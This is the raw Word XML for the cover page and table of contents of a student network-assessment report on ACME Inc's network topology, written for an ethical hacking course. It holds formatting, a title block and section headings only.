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31F9B5" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E455C62" w14:textId="77777777" w:rsidR="00527338" w:rsidRDefault="00527338" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45F60E51" w14:textId="77777777" w:rsidR="00A50E2A" w:rsidRDefault="009C5438" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="743610AB" wp14:editId="592A5E0A">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B9016DD" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>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43F7587C" w14:textId="77777777" w:rsidTr="0022030D">
        <w:trPr>
          <w:cantSplit/>
          <w:trHeight w:val="4958"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7283" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31C9E32B" w14:textId="21582619" w:rsidR="009627B3" w:rsidRDefault="005347C4" w:rsidP="008605B2">
            <w:pPr>
              <w:spacing w:after="0" w:line="260" w:lineRule="auto"/>
              <w:ind w:right="4"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
              <w:t>Network Assessment</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="291CBC05" w14:textId="389D2A49" w:rsidR="009627B3" w:rsidRDefault="005347C4" w:rsidP="005347C4">
            <w:pPr>
              <w:ind w:right="4"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">An Assessment </w:t>
            </w:r>
            <w:r w:rsidR="00423663">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>on the Topology of ACME Inc’s Computer Network</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="315CC6ED" w14:textId="20487041" w:rsidR="0022030D" w:rsidRPr="009627B3" w:rsidRDefault="00423663" w:rsidP="008605B2">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="4"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="40"/>
              </w:rPr>
              <w:t>Annie Place</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F484677" w14:textId="2BA3FEE1" w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="0022030D" w:rsidP="008605B2">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="4"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>CMP</w:t>
            </w:r>
            <w:r w:rsidR="00423663">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>314</w:t>
            </w:r>
            <w:r w:rsidR="002E653A">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidR="00423663">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>Computer Networking</w:t>
            </w:r>
            <w:r w:rsidR="00E66886">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve"> 2</w:t>
            </w:r>
            <w:r w:rsidR="009C1A03">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22C4314D" w14:textId="2A33A4D9" w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="009627B3" w:rsidP="008605B2">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="4"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>BSc Ethical Hacking</w:t>
            </w:r>
            <w:r w:rsidR="0022030D" w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve"> Year </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BA42A4B" w14:textId="510585DE" w:rsidR="0022030D" w:rsidRDefault="008B7EEA" w:rsidP="008605B2">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="4"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="00E66886">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r w:rsidR="00E66886">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="030A73B4" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43056E06" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="425AA769" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AD53FB6" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51F9F76B" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D959697" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EBF0D13" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3265733C" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79029CD6" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7447A7FD" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C0484A0" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5460E7BC" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24A6E9A5" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="325E2A52" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="618A5B49" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65D6C3C3" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B20F537" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A6C35F8" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="529B16B0" w14:textId="77777777" w:rsidR="009C1A03" w:rsidRDefault="009C1A03" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12BCBE1E" w14:textId="77777777" w:rsidR="009C1A03" w:rsidRDefault="009C1A03" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52485DFD" w14:textId="77777777" w:rsidR="009C1A03" w:rsidRDefault="009C1A03" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65BB5CAD" w14:textId="77777777" w:rsidR="009C1A03" w:rsidRDefault="009C1A03" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="645F2FA7" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="008605B2">
      <w:pPr>
        <w:framePr w:hSpace="180" w:wrap="around" w:vAnchor="page" w:hAnchor="margin" w:xAlign="center" w:y="7553"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E88DD8B" w14:textId="1B07C335" w:rsidR="00974F37" w:rsidRPr="00E66886" w:rsidRDefault="0022030D" w:rsidP="00E66886">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C015A8">
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Note that Information contained in this document is for educational purposes.</w:t>
      </w:r>
      <w:r w:rsidR="00CA5897">
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A7F948" w14:textId="13D88F37" w:rsidR="009C1A03" w:rsidRDefault="009C1A03"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:id w:val="-265923424"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="70A0FE8D" w14:textId="66BED624" w:rsidR="00712DC9" w:rsidRPr="00712DC9" w:rsidRDefault="00712DC9" w:rsidP="009C1A03">
          <w:pPr>
            <w:pStyle w:val="Title"/>
            <w:ind w:right="4"/>
          </w:pPr>
          <w:r w:rsidRPr="00974F37">
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="103B3816" w14:textId="31D12DF3" w:rsidR="007F6F59" w:rsidRDefault="00404615">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00712DC9">
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc183984542" w:history="1">
            <w:r w:rsidR="007F6F59" w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="007F6F59">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="007F6F59" w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introduction</w:t>
            </w:r>
            <w:r w:rsidR="007F6F59">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="007F6F59">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="007F6F59">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984542 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="007F6F59">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="007F6F59">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="007F6F59">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4AE36E19" w14:textId="22BC26D4"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43" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Background</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984543 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="12038136" w14:textId="20C18931"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44" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Aims</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984544 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2B80BD13" w14:textId="3D995444"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45" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools Used</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984545 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="04E24E2F" w14:textId="18AB6FF5" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984546" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Network Overview</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984546 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="78DE111A" w14:textId="14CBAD4B"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47" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Network Diagram</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984547 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7A42FCD7" w14:textId="4A040301"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48" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Routing Table</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984548 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="76EAC19B" w14:textId="2B846A93"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49" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Subnet Table</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984549 \h </w:instrText>
